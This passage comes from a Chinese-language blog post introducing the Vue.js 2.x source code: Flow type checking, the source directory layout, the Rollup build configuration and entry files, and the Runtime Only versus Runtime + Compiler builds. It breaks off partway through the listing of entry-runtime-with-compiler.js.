    <content type="html"><![CDATA[<p>随着vue3.x的正式版推出，再加上长时间的使用vue，本着对本质的追求，学习总结一下源码的学习。考虑到3.x的相关环境还不是很稳定，未来一段时间，大多数时候用的应该还是2.x，先从2.x版本源码学习，相对网上参考资料也多。总结结合知识汇总下。</p><p>本篇主要关于对vue源码的简单认识，主要是前期的准备工作。<br><a id="more"></a></p><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><p><a href="https://flow.org/en/docs/getting-started/" target="_blank" rel="noopener">Flow</a> 是 facebook 出品的 JavaScript 静态类型检查工具。Vue.js 的源码利用了 Flow 做了静态类型检查，所以了解 Flow 有助于我们阅读源码。</p><p><em>类似的还有<a href="http://www.typescriptlang.org/" target="_blank" rel="noopener">TypeScript</a>,这里推荐下<a href="https://ts.xcatliu.com/" target="_blank" rel="noopener">https://ts.xcatliu.com/</a>，相对官网文档，更容易学习TS</em></p><h3 id="类型检测"><a href="#类型检测" class="headerlink" title="类型检测"></a>类型检测</h3><p>类型检测的优点是有目共睹的，对于js其灵活性既是优点也有缺陷，过于灵活的副作用是很容易就写出非常隐蔽的隐患代码，在编译期甚至看上去都不会报错，但在运行阶段就可能出现各种奇怪的 bug。</p><blockquote><p>类型检查，就是在编译期尽早发现（由类型错误引起的）bug，又不影响代码运行（不需要运行时动态检查类型），使编写 JavaScript 具有和编写 Java 等强类型语言相近的体验。</p></blockquote><h3 id="为什么用flow"><a href="#为什么用flow" class="headerlink" title="为什么用flow"></a>为什么用flow</h3><p>Vue.js 在做 2.0 重构的时候，在 ES2015 的基础上，除了 ESLint 保证代码风格之外，也引入了 Flow 做静态类型检查。之所以选择 Flow，主要是因为 Babel 和 ESLint 都有对应的 Flow 插件以支持语法，可以完全沿用现有的构建配置，非常小成本的改动就可以拥有静态类型检查的能力。</p><p><em>备注：这里个人推荐多人协作使用ts，个人或者需要类型检测可灵活配置时使用flow。</em></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>这个简单写一下相关语法，熟悉ts或者后台语言，很容易理解这方面的知识。具体没提到的推荐在官网查看。</p><h4 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h4><ul><li>类型推断：通过变量的使用上下文来推断出变量类型，然后根据这些推断来检查类型。</li><li>类型注释：事先注释好我们期待的类型，Flow 会基于这些注释来判断。</li></ul><h5 id="类型推断"><a href="#类型推断" class="headerlink" title="类型推断"></a>类型推断</h5><p>不需要任何代码修改即可进行类型检查，最小化开发者的工作量。它不会强制你改变开发习惯，因为它会自动推断出变量的类型。这就是所谓的类型推断，Flow 最重要的特性之一。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*@flow*/</span>    <span class="comment">//有这个注释定义时，flow才会去识别</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">split</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(<span class="string">' '</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">split(<span class="number">11</span>) <span class="comment">//报错，提示不是字符串类型</span></span><br></pre></td></tr></table></figure><h5 id="类型注释"><a href="#类型注释" class="headerlink" title="类型注释"></a>类型注释</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*@flow*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: number, y: number</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="string">'Hello'</span>, <span class="number">11</span>) <span class="comment">// x，y都应为num，报错提示类型错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组 Array&lt;T&gt;</span></span><br><span class="line"><span class="keyword">var</span> arr: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr.push(<span class="string">'Hello'</span>) <span class="comment">// 报错，arr定义了数组类型应为number</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类和对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">  x: string;           <span class="comment">// x 是字符串</span></span><br><span class="line">  y: string | number;  <span class="comment">// y 可以是字符串或者数字</span></span><br><span class="line">  z: boolean;</span><br><span class="line">  <span class="keyword">constructor</span>(x: string, y: string | number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x</span><br><span class="line">    <span class="keyword">this</span>.y = y</span><br><span class="line">    <span class="keyword">this</span>.z = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar: Bar = <span class="keyword">new</span> Bar(<span class="string">'hello'</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">var</span> obj: &#123; <span class="attr">a</span>: string, <span class="attr">b</span>: number, <span class="attr">c</span>: <span class="built_in">Array</span>&lt;string&gt;, <span class="attr">d</span>: Bar &#125; = &#123;</span><br><span class="line">  a: <span class="string">'hello'</span>,</span><br><span class="line">  b: <span class="number">11</span>,</span><br><span class="line">  c: [<span class="string">'hello'</span>, <span class="string">'world'</span>],</span><br><span class="line">  d: <span class="keyword">new</span> Bar(<span class="string">'hello'</span>, <span class="number">3</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// null 若想任意类型 T 可以为 null 或者 undefined，只需类似如下写成 ?T 的格式即可</span></span><br><span class="line"><span class="keyword">var</span> foo: ?string = <span class="literal">null</span>  <span class="comment">// foo可以时string也可以时null</span></span><br></pre></td></tr></table></figure><h3 id="vue源码中的flow"><a href="#vue源码中的flow" class="headerlink" title="vue源码中的flow"></a>vue源码中的flow</h3><p>想引用第三方库，或者自定义一些类型，但 Flow 并不认识，因此检查的时候会报错。为了解决这类问题，Flow 提出了一个 libdef 的概念，可以用来识别这些第三方库或者是自定义类型，而 Vue.js 也利用了这一特性。</p><p>在 Vue.js 的主目录下有 .flowconfig 文件， 它是 Flow 的配置文件，感兴趣的同学可以看官方文档。这其中的 [libs] 部分用来描述包含指定库定义的目<br>录，默认是名为 flow-typed 的目录。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">├── compiler.js        # 编译相关</span><br><span class="line">├── component.js       # 组件数据结构</span><br><span class="line">├── global-api.js      # Global API 结构</span><br><span class="line">├── modules.js         # 第三方库定义</span><br><span class="line">├── options.js         # 选项相关</span><br><span class="line">├── ssr.js             # 服务端渲染相关</span><br><span class="line">├── vnode.js           # 虚拟 node 相关</span><br><span class="line">├── weex.js            # weex框架 相关</span><br></pre></td></tr></table></figure><p><em>关于weex，推荐官网<a href="https://weex.apache.org/zh/guide/introduction.html" target="_blank" rel="noopener">https://weex.apache.org/zh/guide/introduction.html</a>，简单来讲就是一套代码多个平台。</em></p><h2 id="vue源码目录"><a href="#vue源码目录" class="headerlink" title="vue源码目录"></a>vue源码目录</h2><p>主代码在src目录下，简单结构如下。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">├── compiler        # 编译相关</span><br><span class="line">├── core            # 核心代码</span><br><span class="line">├── platforms       # 不同平台的支持</span><br><span class="line">├── server          # 服务端渲染</span><br><span class="line">├── sfc             # .vue 文件解析</span><br><span class="line">├── shared          # 共享代码</span><br></pre></td></tr></table></figure><h3 id="compiler"><a href="#compiler" class="headerlink" title="compiler"></a>compiler</h3><p>compiler 目录包含 Vue.js 所有编译相关的代码。它包括把模板解析成 ast 语法树，ast 语法树优化，代码生成等功能。</p><p>编译的工作可以在构建时做（借助 webpack、vue-loader 等辅助插件）；也可以在运行时做，使用包含构建功能的 Vue.js。显然，编译是一项耗性能的工作，所以更推荐前者——离线编译。</p><h3 id="core"><a href="#core" class="headerlink" title="core"></a>core</h3><p>core 目录包含了 Vue.js 的核心代码，包括内置组件、全局 API 封装，Vue 实例化、观察者、虚拟 DOM、工具函数等等。</p><h3 id="platforms"><a href="#platforms" class="headerlink" title="platforms"></a>platforms</h3><p>Vue.js 是一个跨平台的 MVVM 框架，它可以跑在 web 上，也可以配合 weex 跑在 native 客户端上。platform 是 Vue.js 的入口，2 个目录代表 2 个主要入口，分别打包成运行在 web 上和 weex 上的 Vue.js。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>Vue.js 2.0 支持了服务端渲染，所有服务端渲染相关的逻辑都在这个目录下。注意：这部分代码是跑在服务端的 Node.js</p><p>服务端渲染主要的工作是把组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器，最后将静态标记”混合”为客户端上完全交互的应用程序。</p><h3 id="sfc"><a href="#sfc" class="headerlink" title="sfc"></a>sfc</h3><p>通常我们开发 Vue.js 都会借助 webpack 构建， 然后通过 .vue 单文件来编写组件。这个目录下的代码逻辑会把 .vue 文件内容解析成一个 JavaScript 的对象。</p><h3 id="shared"><a href="#shared" class="headerlink" title="shared"></a>shared</h3><p>Vue.js 会定义一些工具方法，这里定义的工具方法都是会被浏览器端的 Vue.js 和服务端的 Vue.js 所共享的。</p><h2 id="源码构建"><a href="#源码构建" class="headerlink" title="源码构建"></a>源码构建</h2><p>Vue.js 源码是基于 <a href="https://github.com/rollup/rollup" target="_blank" rel="noopener">Rollup</a> 构建的，它的构建相关配置都在 scripts 目录下。</p><h3 id="构建脚本"><a href="#构建脚本" class="headerlink" title="构建脚本"></a>构建脚本</h3><p>基于 NPM 托管的项目都会有一个 package.json 文件。总共有 3 条命令，作用都是构建 Vue.js，后面 2 条是在第一条命令的基础上，添加一些环境参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"script"</span>: &#123;</span><br><span class="line">    <span class="string">"build"</span>: <span class="string">"node scripts/build.js"</span>,</span><br><span class="line">    <span class="string">"build:ssr"</span>: <span class="string">"npm run build -- web-runtime-cjs,web-server-renderer"</span>,</span><br><span class="line">    <span class="string">"build:weex"</span>: <span class="string">"npm run build -- weex"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h3><p>构建的入口 JS 文件，在 scripts/build.js 中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> builds = <span class="built_in">require</span>(<span class="string">'./config'</span>).getAllBuilds()</span><br><span class="line"></span><br><span class="line"><span class="comment">// filter builds via command line arg</span></span><br><span class="line"><span class="keyword">if</span> (process.argv[<span class="number">2</span>]) &#123;</span><br><span class="line">  <span class="keyword">const</span> filters = process.argv[<span class="number">2</span>].split(<span class="string">','</span>)</span><br><span class="line">  builds = builds.filter(<span class="function"><span class="params">b</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> filters.some(<span class="function"><span class="params">f</span> =&gt;</span> b.output.file.indexOf(f) &gt; <span class="number">-1</span> || b._name.indexOf(f) &gt; <span class="number">-1</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// filter out weex builds by default</span></span><br><span class="line">  builds = builds.filter(<span class="function"><span class="params">b</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> b.output.file.indexOf(<span class="string">'weex'</span>) === <span class="number">-1</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">build(builds)</span><br></pre></td></tr></table></figure><p>配置文件，在 scripts/config.js 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> builds = &#123;</span><br><span class="line">  <span class="comment">// Runtime only (CommonJS). Used by bundlers e.g. Webpack &amp; Browserify</span></span><br><span class="line">  <span class="string">'web-runtime-cjs'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.runtime.common.js'</span>),</span><br><span class="line">    format: <span class="string">'cjs'</span>,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Runtime+compiler CommonJS build (CommonJS)</span></span><br><span class="line">  <span class="string">'web-full-cjs'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime-with-compiler.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.common.js'</span>),</span><br><span class="line">    format: <span class="string">'cjs'</span>,</span><br><span class="line">    alias: &#123; <span class="attr">he</span>: <span class="string">'./entity-decoder'</span> &#125;,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Runtime only (ES Modules). Used by bundlers that support ES Modules,</span></span><br><span class="line">  <span class="comment">// e.g. Rollup &amp; Webpack 2</span></span><br><span class="line">  <span class="string">'web-runtime-esm'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.runtime.esm.js'</span>),</span><br><span class="line">    format: <span class="string">'es'</span>,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Runtime+compiler CommonJS build (ES Modules)</span></span><br><span class="line">  <span class="string">'web-full-esm'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime-with-compiler.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.esm.js'</span>),</span><br><span class="line">    format: <span class="string">'es'</span>,</span><br><span class="line">    alias: &#123; <span class="attr">he</span>: <span class="string">'./entity-decoder'</span> &#125;,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// runtime-only build (Browser)</span></span><br><span class="line">  <span class="string">'web-runtime-dev'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.runtime.js'</span>),</span><br><span class="line">    format: <span class="string">'umd'</span>,</span><br><span class="line">    env: <span class="string">'development'</span>,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// runtime-only production build (Browser)</span></span><br><span class="line">  <span class="string">'web-runtime-prod'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.runtime.min.js'</span>),</span><br><span class="line">    format: <span class="string">'umd'</span>,</span><br><span class="line">    env: <span class="string">'production'</span>,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Runtime+compiler development build (Browser)</span></span><br><span class="line">  <span class="string">'web-full-dev'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime-with-compiler.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.js'</span>),</span><br><span class="line">    format: <span class="string">'umd'</span>,</span><br><span class="line">    env: <span class="string">'development'</span>,</span><br><span class="line">    alias: &#123; <span class="attr">he</span>: <span class="string">'./entity-decoder'</span> &#125;,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// Runtime+compiler production build  (Browser)</span></span><br><span class="line">  <span class="string">'web-full-prod'</span>: &#123;</span><br><span class="line">    entry: resolve(<span class="string">'web/entry-runtime-with-compiler.js'</span>),</span><br><span class="line">    dest: resolve(<span class="string">'dist/vue.min.js'</span>),</span><br><span class="line">    format: <span class="string">'umd'</span>,</span><br><span class="line">    env: <span class="string">'production'</span>,</span><br><span class="line">    alias: &#123; <span class="attr">he</span>: <span class="string">'./entity-decoder'</span> &#125;,</span><br><span class="line">    banner</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>entry</code> 属性表示构建的入口 JS 文件地址，<code>dest</code> 属性表示构建后的 JS 文件地址。<code>format</code> 属性表示构建的格式，<code>cjs</code> 表示构建出来的文件遵循 <a href="http://wiki.commonjs.org/wiki/Modules/1.1" target="_blank" rel="noopener">CommonJS</a> 规范，<code>es</code> 表示构建出来的文件遵循 <a href="http://exploringjs.com/es6/ch_modules.html" target="_blank" rel="noopener">ES Module</a> 规范。 <code>umd</code> 表示构建出来的文件遵循 <a href="https://github.com/umdjs/umd" target="_blank" rel="noopener">UMD</a> 规范。</p><p>主要使用web端，以 <code>web-runtime-cjs</code> 配置为例，它的 <code>entry</code> 是 <code>resolve(&#39;web/entry-runtime.js&#39;)</code> 下面是 <code>resolve</code> 函数的定义。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码目录：scripts/config.js</span></span><br><span class="line"><span class="keyword">const</span> aliases = <span class="built_in">require</span>(<span class="string">'./alias'</span>)</span><br><span class="line"><span class="keyword">const</span> resolve = <span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> base = p.split(<span class="string">'/'</span>)[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">if</span> (aliases[base]) &#123;</span><br><span class="line">    <span class="keyword">return</span> path.resolve(aliases[base], p.slice(base.length + <span class="number">1</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> path.resolve(__dirname, <span class="string">'../'</span>, p)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先把 <code>resolve</code> 函数传入的参数 <code>p</code> 通过 / 做了分割成数组，然后取数组第一个元素设置为 <code>base</code>。在我们这个例子中，参数 <code>p</code> 是 <code>web/entry-runtime.js</code>，那么 <code>base</code> 则为 <code>web</code>。<code>base</code> 并不是实际的路径，它的真实路径借助了别名的配置，我们来看一下别名配置的代码，在 <code>scripts/alias</code> 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  vue: path.resolve(__dirname, <span class="string">'../src/platforms/web/entry-runtime-with-compiler'</span>),</span><br><span class="line">  compiler: path.resolve(__dirname, <span class="string">'../src/compiler'</span>),</span><br><span class="line">  core: path.resolve(__dirname, <span class="string">'../src/core'</span>),</span><br><span class="line">  shared: path.resolve(__dirname, <span class="string">'../src/shared'</span>),</span><br><span class="line">  web: path.resolve(__dirname, <span class="string">'../src/platforms/web'</span>),</span><br><span class="line">  weex: path.resolve(__dirname, <span class="string">'../src/platforms/weex'</span>),</span><br><span class="line">  server: path.resolve(__dirname, <span class="string">'../src/server'</span>),</span><br><span class="line">  entries: path.resolve(__dirname, <span class="string">'../src/entries'</span>),</span><br><span class="line">  sfc: path.resolve(__dirname, <span class="string">'../src/sfc'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>web</code> 对应的真实的路径是 <code>path.resolve(__dirname, &#39;../src/platforms/web&#39;)</code>，这个路径就找到了 <code>Vue.js</code> 源码的 <code>web</code> 目录。然后 <code>resolve</code> 函数通过 <code>path.resolve(aliases[base]</code>, <code>p.slice(base.length + 1))</code> 找到了最终路径，它就是 <code>Vue.js</code> 源码 <code>web</code> 目录下的 <code>entry-runtime.js</code>。因此，<code>web-runtime-cjs</code> 配置对应的入口文件就找到了。</p><p>它经过 <code>Rollup</code> 的构建打包后，最终会在 <code>dist</code> 目录下生成 <code>vue.runtime.common.js</code></p><h3 id="关于Runtime-Only-OR-Runtime-Compiler"><a href="#关于Runtime-Only-OR-Runtime-Compiler" class="headerlink" title="关于Runtime Only OR Runtime + Compiler"></a>关于Runtime Only OR Runtime + Compiler</h3><ul><li>Runtime Only</li></ul><p>通常需要借助如 webpack 的 vue-loader 工具把 .vue 文件编译成 JavaScript，因为是在编译阶段做的，所以它只包含运行时的 Vue.js 代码，因此代码体积也会更轻量。</p><ul><li>Runtime + Compiler</li></ul><p>没有对代码做预编译，但又使用了 Vue 的 template 属性并传入一个字符串，则需要在客户端编译模板，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要编译器的版本</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  template: <span class="string">'&lt;div&gt;&#123;&#123; hi &#125;&#125;&lt;/div&gt;'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种情况不需要</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render (h) &#123;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">'div'</span>, <span class="keyword">this</span>.hi)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在 Vue.js 2.0 中，最终渲染都是通过 render 函数。</p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>在 web 应用下，<code>Runtime + Compiler</code> 构建出来的 <code>Vue.js</code>，它的入口是 <code>src/platforms/web/entry-runtime-with-compiler.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* @flow */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> config <span class="keyword">from</span> <span class="string">'core/config'</span></span><br><span class="line"><span class="keyword">import</span> &#123; warn, cached &#125; <span class="keyword">from</span> <span class="string">'core/util/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; mark, measure &#125; <span class="keyword">from</span> <span class="string">'core/util/perf'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'./runtime/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; query &#125; <span class="keyword">from</span> <span class="string">'./util/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; compileToFunctions &#125; <span class="keyword">from</span> <span class="string">'./compiler/index'</span></span><br><span class="line"><span class="keyword">import</span> &#123; shouldDecodeNewlines, shouldDecodeNewlinesForHref &#125; <span class="keyword">from</span> <span class="string">'./util/compat'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> idToTemplate = cached(<span class="function"><span class="params">id</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> el = query(id)</span><br><span class="line">  <span class="keyword">return</span> el &amp;&amp; el.innerHTML</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mount = Vue.prototype.$mount</span><br><span class="line">Vue.prototype.$mount = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  el?: string | Element,</span></span></span><br><span class="line"><span class="function"><span class="params">  hydrating?: boolean</span></span></span><br><span class="line"><span class="function"><span class="params"></span>): <span class="title">Component</span> </span>&#123;</span><br><span class="line">  el = el &amp;&amp; query(el)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* istanbul ignore if */</span></span><br><span class="line">  <span class="keyword">if</span> (el === <span class="built_in">document</span>.body || el === <span class="built_in">document</span>.documentElement) &#123;</span><br><span class="line">    process.env.NODE_ENV !== <span class="string">'production'</span> 